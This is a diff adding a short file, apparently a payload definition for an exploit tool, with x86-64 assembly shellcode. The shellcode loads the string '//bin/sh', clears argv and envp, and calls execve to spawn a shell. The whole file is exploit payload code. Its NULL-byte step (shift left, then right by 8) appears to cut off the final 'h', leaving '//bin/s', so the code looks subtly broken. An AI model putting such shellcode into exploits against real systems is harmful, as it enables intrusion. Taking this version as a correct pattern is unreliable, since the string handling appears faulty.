@@ -1,0 +1,20 @@
+[[data]]
+PROGRAM_BIN_SH: "//bin/sh"
+
+[[code]]
+[bin_sh]
+# Zero-out argv and envp
+xor rdx, rdx
+xor rsi, rsi
+
+mov rcx, [rel PROGRAM_BIN_SH]
+
+# Insert NULL-byte
+shl rcx, 0x08
+shr rcx, 0x08
+
+# Push to stack, then copy literal string
+push rcx
+lea rdi, [rsp]
+mov eax, 0x3b
+syscall
